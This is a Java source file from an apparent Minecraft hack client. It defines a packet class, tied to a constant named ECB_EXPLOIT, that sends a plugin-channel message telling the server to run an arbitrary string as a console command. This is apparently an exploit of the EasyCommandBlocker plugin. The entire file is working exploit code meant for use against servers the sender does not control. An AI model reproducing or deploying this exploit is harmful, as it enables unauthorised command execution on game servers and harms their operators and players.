package dev.wrrulosdev.mcpclient.client.payloads;

import dev.wrrulosdev.mcpclient.client.constants.IdentifierConstants;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Objects;

public record EasyCommandBlockerPayloadPacket(String command) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, EasyCommandBlockerPayloadPacket> CODEC = CustomPayload.codecOf(EasyCommandBlockerPayloadPacket::write, EasyCommandBlockerPayloadPacket::new);
    public static final Id<EasyCommandBlockerPayloadPacket> ID = new Id<>(IdentifierConstants.ECB_EXPLOIT);

    /**
     * Private constructor used for deserialization of the packet.
     *
     * @param buf The buffer containing the serialized packet data.
     */
    private EasyCommandBlockerPayloadPacket(PacketByteBuf buf) {
        this(buf.readString());
    }

    /**
     * Sends the command blocking data packet to the server.
     *
     * @param command The command to execute in the console.
     */
    public static void send(String command) {
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler())
            .sendPacket(new CustomPayloadC2SPacket(new EasyCommandBlockerPayloadPacket(command)));
    }

    /**
     * Serializes the packet data into the provided buffer.
     *
     * @param buf The buffer where the packet data will be written to.
     */
    public void write(PacketByteBuf buf) {
        try {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            DataOutputStream out = new DataOutputStream(stream);
            out.writeUTF("ActionsSubChannel");
            out.writeUTF("console_command: " + command);
            buf.writeBytes(stream.toByteArray());

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Gets the ID of this custom payload packet.
     *
     * @return The ID representing this custom payload packet.
     */
    public Id<EasyCommandBlockerPayloadPacket> getId() {
        return ID;
    }
}
